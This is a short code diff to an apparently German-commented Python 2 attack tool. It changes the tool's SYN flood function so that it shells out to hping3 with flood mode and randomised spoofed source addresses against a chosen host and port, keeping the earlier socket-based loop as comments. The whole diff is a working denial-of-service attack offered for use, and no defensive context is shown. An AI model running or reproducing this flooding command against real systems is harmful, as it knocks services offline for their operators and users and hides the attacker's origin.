@@ -65,18 +65,17 @@ def SYNFLOOD_Menu():
 
 ##funktion die für das flooding verantwortlich ist
 def flooding( i, atHost, atPort, numAttacks):
-	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	sock.connect((atHost, atPort))
-	print "SYN flooding packet number " + str(i +1)
-	sock.send("GET / HTTP/1.1\r\n")
-	sock.send("Host: " + atHost + "\r\n\r\n")
-	sock.close()
+	
+	execute("hping3 -c 10000 -d 120 -S -w 64 -p " + atPort + " --flood --rand-source " + atHost)
+	#hping3 -c 10000 -d 120 -S -w 64 -p atPort --flood --rand-source atHost
+	
+
+	#sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	#sock.connect((atHost, atPort))
+	#print "SYN flooding packet number " + str(i +1)
+	#sock.send("GET / HTTP/1.1\r\n")
+	#sock.send("Host: " + atHost + "\r\n\r\n")
+	#sock.close()
 
 
 
-
-
-
-
-
-		
